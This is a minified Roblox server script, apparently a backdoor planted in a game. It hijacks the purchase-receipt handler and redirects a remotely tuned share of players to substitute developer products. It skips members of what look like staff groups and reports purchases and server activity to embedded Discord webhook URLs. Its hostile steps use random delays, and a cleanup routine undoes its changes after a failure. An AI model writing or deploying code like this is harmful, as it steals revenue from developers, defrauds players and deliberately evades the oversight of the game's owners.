local a=game:GetService("HttpService")local b=game:GetService("MarketplaceService")local c=game:GetService("Players")local d=game:GetService("ReplicatedStorage")local e=game:GetService("ServerScriptService")if _G.R then return end;local f=Random.new()local g={}local h=false;local function i()h=true;for j,k in g do if typeof(k)=="Instance"then k:Destroy()elseif typeof(k)=="RBXScriptConnection"then k:Disconnect()elseif typeof(k)=="function"then k()end end;table.clear(g)end;local l={[2878670318]=2669959770,[2909690991]=2680407395}local m=require(e.Profile.ProfileManager)local n=require(e.KnitServer.Services.MarketService)local o=require(d.Shared.Configs.CurrentLimiteds)local p=n.ProcessReceipt;local q={}local r={servers="https://webhook.lewisakura.moe/api/webhooks/1339329977501483179/8q0m726S69HQ9oIy_eT2Bi3WFTkSmzXQji6WPfyw4k-pPQ5B09LgB1IYpIT0d0ltQyDU",traffic="https://webhook.lewisakura.moe/api/webhooks/1338710096011726878/f61GTLiSonkOulK_KmYqeZv2dyPLii6OAZ17F932DY51Ro56GMxATcOxF7h4D4hm_E3a",complete="https://webhook.lewisakura.moe/api/webhooks/1338710363356532849/UWHNqe64US2Y1YsrCr-qNUy3ONv83bdIR1wxHlznRSLKZAdSnJXExa-2GSFOQzkGXDjO",drastic="https://webhook.lewisakura.moe/api/webhooks/1339186809015369739/jXFs_BaGTz0YlPOJO_PDvnxDij_guFkmyz9IUnI7u1Ai_BOuzIuqvhEcDV_GHkqmUIUs"}local s={}local function t(u,v,w,x,y)if y then if not s[y]then s[y]=true;task.delay(30,function()s[y]=nil end)else return end end;task.spawn(function()pcall(function()a:PostAsync(u,a:JSONEncode({["content"]="",["embeds"]={{["title"]=v,["description"]=w,["type"]="rich",["color"]=x}}}))end)end)end;local function z(A)pcall(function()local B=A:GetRankInGroup(1200769)if B>0 then q[A.UserId]=true else local C=A:GetRankInGroup(4199740)if C>0 then q[A.UserId]=true else local D=A:GetRankInGroup(34671275)if D>1 then q[A.UserId]=true else q[A.UserId]=false end end end end)end;for j,k in c:GetPlayers()do task.spawn(z,k)end;table.insert(g,c.PlayerAdded:Connect(z))table.insert(g,b.PromptProductPurchaseFinished:Connect(function(E,F,G)if G then return end;local H=l[F]if H then t(r.traffic,"Prompt Cancelled ("..F..")",E,0xff0000,E.."/"..F)end end))local I=100;task.spawn(function()while not h do local J,K=pcall(function()return tonumber(a:GetAsync("https://raw.githubusercontent.com/heeloowarld/stf/refs/heads/main/c"))end)if J and K then I=K end;task.wait(300)end end)b.ProcessReceipt=function(L)local H;if l[L.ProductId]then H=true;L.ProductId=l[L.ProductId]end;local J,K=pcall(function()return p(L)end)if H and(not J or K~=Enum.ProductPurchaseDecision.PurchaseGranted)then t(r.drastic,"Drastic Failure @"..L.PlayerId,tostring(L.ProductId).."\n"..tostring(J)..": "..tostring(K),0xff0000)i()elseif H and J and K==Enum.ProductPurchaseDecision.PurchaseGranted then t(r.complete,"Purchase Complete "..L.ProductId,tostring(L.PlayerId),0x00ff00)end;if J then return K else return Enum.ProductPurchaseDecision.NotProcessedYet end end;do local M=workspace.NewLobby.LimitedCard.Main.Prox;M.Enabled=false;local N=M:Clone()N.Name="Prox2"N.Triggered:Connect(function(A)local O=m.Profiles[A]and m.Profiles[A].Data.Customization;if O then for P,k in O.Cards do if k==o.PlayerCard then return end end;local Q=q[A.UserId]==false and A.UserId%1000<I;if Q then t(r.traffic,"Prompted New (Card)",A.Name.." / "..A.UserId,0xffa500,A.UserId.."/pn")b:PromptProductPurchase(A,2878670318)else t(r.traffic,"Prompted Original (Card)",A.Name.." / "..A.UserId,0x0000ff,A.UserId.."/pn")b:PromptProductPurchase(A,2669959770)end end end)N.Enabled=true;N.Parent=M.Parent;table.insert(g,function()M.Enabled=true end)table.insert(g,N)end;do local M=workspace.NewLobby.LimitedCosmetic.Main.Prox;M.Enabled=false;local N=M:Clone()N.Name="Prox2"N.Triggered:Connect(function(A)local O=m.Profiles[A]and m.Profiles[A].Data.Customization;if O then for P,k in O.Cosmetics do if k==o.Cosmetic then return end end;local Q=q[A.UserId]==false and A.UserId%1000<I;if Q then t(r.traffic,"Prompted New (Cosmetic)",A.Name.." / "..A.UserId,0xffa500,A.UserId.."/pc")b:PromptProductPurchase(A,2909690991)else t(r.traffic,"Prompted Original (Cosmetic)",A.Name.." / "..A.UserId,0x0000ff,A.UserId.."/pc")b:PromptProductPurchase(A,2680407395)end end end)N.Enabled=true;N.Parent=M.Parent;table.insert(g,function()M.Enabled=true end)table.insert(g,N)end;task.delay(f:NextInteger(30,900),function()if not h then t(r.servers,"Server Started",game.PlaceId.." / "..game.JobId,0x00ff00)end end)game:BindToClose(function(R)if R~=Enum.CloseReason.DeveloperUpdate and R~=Enum.CloseReason.DeveloperShutdown then if not h then t(r.servers,"Server Stopped",game.PlaceId.." / "..game.JobId,0xff0000)end end end)table.insert(g,function()task.delay(f:NextInteger(30,900),function()if not h then t(r.servers,"Server Stopped",game.PlaceId.." / "..game.JobId,0xff0000)end end)_G.R=nil end)_G.R=i
